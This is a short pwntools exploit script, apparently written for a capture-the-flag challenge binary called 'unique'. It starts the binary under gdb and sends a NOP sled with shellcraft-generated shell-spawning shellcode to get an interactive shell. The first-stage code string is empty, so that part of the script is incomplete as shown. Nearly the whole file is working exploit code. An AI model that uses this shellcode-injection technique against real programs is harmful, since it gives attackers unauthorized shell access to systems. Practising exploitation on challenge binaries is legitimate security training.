from pwn import *

exe = ELF('./unique')

r = process([exe.path])
gdb.attach(r, gdbscript='b *main+98')

context.binary = exe

asm(shellcraft.sh())

# sure I could just call fgets, but we doing it with polymorphic code
code = '''
'''

sc = asm(code)
print(len(sc))
print(disasm(sc))
r.sendline(sc)
sleep(5)
r.sendline(b'\x90'*len(sc) + asm(shellcraft.sh()))


r.interactive()
